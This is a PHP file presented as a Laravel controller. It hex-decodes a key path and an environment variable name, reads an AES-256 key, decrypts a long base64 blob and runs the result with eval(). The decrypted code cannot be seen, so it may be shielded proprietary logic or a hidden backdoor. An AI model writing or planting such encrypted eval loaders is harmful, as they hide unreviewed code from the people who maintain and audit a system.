<?php
namespace App\Http\Controllers\Brimen;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3WUgGRkVgVHrL0gtZWHTGA==');

$c=base64_decode(

'u7X1h2CMMUWPyFrFRHQojlAIV4rCHMe+ekT0qTVWWg0yhSg286dq+b4sKfTkcg80DWDDiQdJ50sg' .
'xDUZ+3aDcRGGLxCjjJHk4PQ0LZPhAc2VcFVNrOJ5K5lUq+W9WhxQ3RVSWrHfXJesxGgHWmn8fDXT' .
'0gv8j+j8avQmO1RiQBK0d2TrH0abgoVUwdwL2V+pjjRl0TzJv+LpRKHiEBMrj4oUqMxrQTQO4m7V' .
'EC9q4Pj3wHyfOWC1QdxecHIRc8vphSfA8s0tTc9qTpTxrCqYYWOE64PlVQeGw5AGjjTTlhut4pMW' .
'YtLCP4iMV+Z+Rg0eMFWT1tra7SUlcKhl4mriY2XGtnQYbiqJwLcQ5bfACqC0zo52TEvFUgwxkOK+' .
'rlWotA8nv/dHaNjxuZ3X3xrQu1Uy2dWDKdJTzTbJxYGYyTefDN7SJEwrWiO1HRWbIHiCLdG2SIkU' .
'lNh65OwbkaeVJ4RFOIggRC0anA1QxuyjlGjIFZ89WvsFR49uMCcMA4KrxZg2td+TZiage23Ucrvi' .
'tTKGwA7eLVmZKTz76KqfqU2+5r/mAzUj95sMFJc7z6JkG/wLcdb2lnLBWWJ4t/AmqimfdY8wrfKY' .
'M+zHM+3NNtRh4FekOOAFkIpatuw+6pRqQa51V0mL8zkpSsDn4IaTlmKqSC4CMhPXQKsSv5JHEjUj' .
'/V5Y+d770ps8MNGRWBBPHPGXUmyXUIYNrQ9JwT3AGr80PxDp53zmPdEhIqxoj2nfUEA3Z5YWAo6M' .
'YLRQAViGrrKHJvsFaVoeshmQ1TDMP2uF32QQMuBeB1V+E7AdfB1YXx2ZWB5C/5SZ6QoCpe/QCrIt' .
'xk+2W+jWGC6LdyJQZEE9gh8H9UQXmcMn1d4IkNfudtuJ76CI82908XkuLKMfng3JWf8J6qvJdtGg' .
'LnwZcZ5bjpPDZXJ+eapzCyfNmx4XI0IoBZXwLJXXuUu/ZPswGVh0AlW4pgDJxCB+cLWxlf53+GFV' .
'nMVGAWp23s+JeYkA2m4Q+6tZl6S5Plid4pT3uUp9Qo9BqrLFGRgpsJ/NElhJwep/62xjHIoIgf1i' .
'qnslZSP+9bBfDh80s17nQfxwCbpQq47gAFi9PymqOjvP+KZuOC23w3YZVltSdZh6sFkwqBM06+lh' .
'ANBKNrskrloafF6xq8bT3kkiWjHRv34UWT9mwMwqc4wZTcyEG6hgWMUCVemmISo8IxtRMvlJSQ0n' .
'yk744oB2L4Rz8MaAQqN0e19PE/OFj9RvpCh7Tyj/lFDbAFyc1oKZ+YrcI56CPJf5fo64uQRv+tWi' .
'nbALvhRrhozR5RPg6G8b53aGG01JPCXOK+m/lS96enDROnB3sdWVTouhBj9xTaz0Sw7BsPcRBbNV' .
'BgCt34uBnKgA+st6m9YIv8EFUg8csye0IO/WrVENtImaUzSuJDVJKbSkSKA1iTRi/zvFNyKioPEs' .
'ItdSjTRlZA4+0OfwWwpoLq59fFtsGaaHGyZV6XvDNhYvV5OhGSbV1Ckajg/TeBnFZa1wYvW91hoD' .
'Noa9nVcm/aBHgcDeanpPW8K1xPi94xhQQwG0PG4TOyj7cOvR0QkQy5mx1dD/xI0PfdmK5J/NGeXU' .
'Tl/JsO4yyZgsWelOohKQ9pVkR97BgkpisQE1YV6598+YarYDCgWFrPFAfyXx2jhV9JyFpS9gOPRh' .
'U2GqnZ+3+jSx1VDqTGc8/lMcKTCfMoN8Y/YNZKZ8PQZEi5B/ToACRB/Acmq2R8GTWnKrr1VUht95' .
'GTZRHoOFWnUMZCnlK3Q+gVooOOjLqt7qWBIHPQNFFcDjqqz6A2jQvBrvJvpiOGf9dvOZsfAuaEx6' .
'5wjvrilaw7HSQraY8A00TbzCrCuOi3HKCgr6sC8oMo2Gho0kfmCoFxCEZMnco0dLHhlmJHfKXm+F' .
'dWHj0ZlJU6zrlt3CmfO5k5nmoayWDrYhc8NGEwVgv2fwHJZOUBnJmYJm6YGb6IPfQlizDqSbocJY' .
'67i2ogyzi0CmZGWwK+k7Htvqiw7ynJ4K3Cj8sK36CdOLvrswYRiNhpRzIcUrUZR4O99OE6rf'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

